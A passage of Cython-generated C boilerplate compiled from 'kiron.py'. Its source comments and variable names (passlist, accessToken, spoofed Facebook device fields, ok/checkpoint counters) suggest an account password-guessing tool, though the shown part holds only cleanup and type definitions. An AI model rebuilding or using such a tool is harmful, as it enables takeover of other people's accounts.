        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "kiron.py":572
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":571
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_AddTraceback("kiron.api2", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_fn);
  __Pyx_XDECREF(__pyx_v_ln);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_accessToken);
  __Pyx_XDECREF(__pyx_v_fbav);
  __Pyx_XDECREF(__pyx_v_fbbv);
  __Pyx_XDECREF(__pyx_v_android_version);
  __Pyx_XDECREF(__pyx_v_model);
  __Pyx_XDECREF(__pyx_v_build);
  __Pyx_XDECREF(__pyx_v_fblc);
  __Pyx_XDECREF(__pyx_v_fbcr);
  __Pyx_XDECREF(__pyx_v_fbmf);
  __Pyx_XDECREF(__pyx_v_fbbd);
  __Pyx_XDECREF(__pyx_v_fbdv);
  __Pyx_XDECREF(__pyx_v_fbsv);
  __Pyx_XDECREF(__pyx_v_fbca);
  __Pyx_XDECREF(__pyx_v_fbdm);
  __Pyx_XDECREF(__pyx_v_fbfw);
  __Pyx_XDECREF(__pyx_v_fbrv);
  __Pyx_XDECREF(__pyx_v_fban);
  __Pyx_XDECREF(__pyx_v_fbpn);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_random_seed);
  __Pyx_XDECREF(__pyx_v_adid);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_secure);
  __Pyx_XDECREF(__pyx_v_family);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_sim_serials);
  __Pyx_XDECREF(__pyx_v_li);
  __Pyx_XDECREF(__pyx_v_li2);
  __Pyx_XDECREF(__pyx_v_j1);
  __Pyx_XDECREF(__pyx_v_jazoest);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_coki);
  __Pyx_XDECREF(__pyx_gb_5kiron_4api2_2generator3);
  __Pyx_XDECREF(__pyx_gb_5kiron_4api2_5generator4);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

#if CYTHON_USE_FREELISTS
static struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *__pyx_freelist_5kiron___pyx_scope_struct__genexpr[8];
static int __pyx_freecount_5kiron___pyx_scope_struct__genexpr = 0;
#endif

static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  #if CYTHON_USE_FREELISTS
  if (likely((int)(__pyx_freecount_5kiron___pyx_scope_struct__genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct__genexpr)))) {
    o = (PyObject*)__pyx_freelist_5kiron___pyx_scope_struct__genexpr[--__pyx_freecount_5kiron___pyx_scope_struct__genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_5kiron___pyx_scope_struct__genexpr));
    (void) PyObject_INIT(o, t);
  } else
  #endif
  {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_5kiron___pyx_scope_struct__genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_5kiron___pyx_scope_struct__genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  #if CYTHON_USE_FREELISTS
  if (((int)(__pyx_freecount_5kiron___pyx_scope_struct__genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct__genexpr)))) {
    __pyx_freelist_5kiron___pyx_scope_struct__genexpr[__pyx_freecount_5kiron___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *)o);
  } else
  #endif
  {
    #if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
    (*Py_TYPE(o)->tp_free)(o);
    #else
    {
      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);
      if (tp_free) tp_free(o);
    }
    #endif
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_5kiron___pyx_scope_struct__genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_5kiron___pyx_scope_struct__genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_5kiron___pyx_scope_struct__genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_5kiron___pyx_scope_struct__genexpr_spec = {
  "kiron.__pyx_scope_struct__genexpr",
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct__genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_5kiron___pyx_scope_struct__genexpr_slots,
};
#else

static PyTypeObject __pyx_type_5kiron___pyx_scope_struct__genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "kiron.""__pyx_scope_struct__genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct__genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_5kiron___pyx_scope_struct__genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_5kiron___pyx_scope_struct__genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

#if CYTHON_USE_FREELISTS
static struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *__pyx_freelist_5kiron___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_5kiron___pyx_scope_struct_1_genexpr = 0;
#endif

static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  #if CYTHON_USE_FREELISTS
  if (likely((int)(__pyx_freecount_5kiron___pyx_scope_struct_1_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_5kiron___pyx_scope_struct_1_genexpr[--__pyx_freecount_5kiron___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
  } else
  #endif
  {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_5kiron___pyx_scope_struct_1_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_5kiron___pyx_scope_struct_1_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  #if CYTHON_USE_FREELISTS
  if (((int)(__pyx_freecount_5kiron___pyx_scope_struct_1_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_5kiron___pyx_scope_struct_1_genexpr[__pyx_freecount_5kiron___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *)o);
  } else
  #endif
  {
    #if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
    (*Py_TYPE(o)->tp_free)(o);
    #else
    {
      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);
      if (tp_free) tp_free(o);
    }
    #endif
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_5kiron___pyx_scope_struct_1_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_5kiron___pyx_scope_struct_1_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_5kiron___pyx_scope_struct_1_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_5kiron___pyx_scope_struct_1_genexpr_spec = {
  "kiron.__pyx_scope_struct_1_genexpr",
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_5kiron___pyx_scope_struct_1_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_5kiron___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "kiron.""__pyx_scope_struct_1_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_5kiron___pyx_scope_struct_1_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_5kiron___pyx_scope_struct_1_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

#if CYTHON_USE_FREELISTS
static struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *__pyx_freelist_5kiron___pyx_scope_struct_2_genexpr[8];
static int __pyx_freecount_5kiron___pyx_scope_struct_2_genexpr = 0;
#endif

static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_2_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  #if CYTHON_USE_FREELISTS
  if (likely((int)(__pyx_freecount_5kiron___pyx_scope_struct_2_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr)))) {
    o = (PyObject*)__pyx_freelist_5kiron___pyx_scope_struct_2_genexpr[--__pyx_freecount_5kiron___pyx_scope_struct_2_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else
  #endif
  {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_5kiron___pyx_scope_struct_2_genexpr(PyObject *o) {
  struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)o;
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && !__Pyx_PyObject_GC_IsFinalized(o)) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_5kiron___pyx_scope_struct_2_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_genexpr_arg_0);
  Py_CLEAR(p->__pyx_v_i);
  Py_CLEAR(p->__pyx_t_0);
  #if CYTHON_USE_FREELISTS
  if (((int)(__pyx_freecount_5kiron___pyx_scope_struct_2_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr)))) {
    __pyx_freelist_5kiron___pyx_scope_struct_2_genexpr[__pyx_freecount_5kiron___pyx_scope_struct_2_genexpr++] = ((struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)o);
  } else
  #endif
  {
    #if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
    (*Py_TYPE(o)->tp_free)(o);
    #else
    {
      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);
      if (tp_free) tp_free(o);
    }
    #endif
  }
}

static int __pyx_tp_traverse_5kiron___pyx_scope_struct_2_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *p = (struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)o;
  if (p->__pyx_genexpr_arg_0) {
    e = (*v)(p->__pyx_genexpr_arg_0, a); if (e) return e;
  }
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  if (p->__pyx_t_0) {
    e = (*v)(p->__pyx_t_0, a); if (e) return e;
  }
  return 0;
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_5kiron___pyx_scope_struct_2_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_5kiron___pyx_scope_struct_2_genexpr},
  {Py_tp_traverse, (void *)__pyx_tp_traverse_5kiron___pyx_scope_struct_2_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_5kiron___pyx_scope_struct_2_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_5kiron___pyx_scope_struct_2_genexpr_spec = {
  "kiron.__pyx_scope_struct_2_genexpr",
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_5kiron___pyx_scope_struct_2_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_5kiron___pyx_scope_struct_2_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "kiron.""__pyx_scope_struct_2_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_5kiron___pyx_scope_struct_2_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_5kiron___pyx_scope_struct_2_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_5kiron___pyx_scope_struct_2_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

#if CYTHON_USE_FREELISTS
static struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *__pyx_freelist_5kiron___pyx_scope_struct_3_genexpr[8];
static int __pyx_freecount_5kiron___pyx_scope_struct_3_genexpr = 0;
#endif

static PyObject *__pyx_tp_new_5kiron___pyx_scope_struct_3_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  #if CYTHON_USE_FREELISTS
  if (likely((int)(__pyx_freecount_5kiron___pyx_scope_struct_3_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr)))) {
    o = (PyObject*)__pyx_freelist_5kiron___pyx_scope_struct_3_genexpr[--__pyx_freecount_5kiron___pyx_scope_struct_3_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr));
    (void) PyObject_INIT(o, t);
  } else
  #endif
  {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_5kiron___pyx_scope_struct_3_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_5kiron___pyx_scope_struct_3_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  #if CYTHON_USE_FREELISTS
  if (((int)(__pyx_freecount_5kiron___pyx_scope_struct_3_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr)))) {
    __pyx_freelist_5kiron___pyx_scope_struct_3_genexpr[__pyx_freecount_5kiron___pyx_scope_struct_3_genexpr++] = ((struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *)o);
  } else
  #endif
  {
    #if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
    (*Py_TYPE(o)->tp_free)(o);
    #else
    {
      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);
      if (tp_free) tp_free(o);
    }
    #endif
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_5kiron___pyx_scope_struct_3_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_5kiron___pyx_scope_struct_3_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_5kiron___pyx_scope_struct_3_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_5kiron___pyx_scope_struct_3_genexpr_spec = {
  "kiron.__pyx_scope_struct_3_genexpr",
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_5kiron___pyx_scope_struct_3_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_5kiron___pyx_scope_struct_3_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "kiron.""__pyx_scope_struct_3_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_5kiron___pyx_scope_struct_3_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
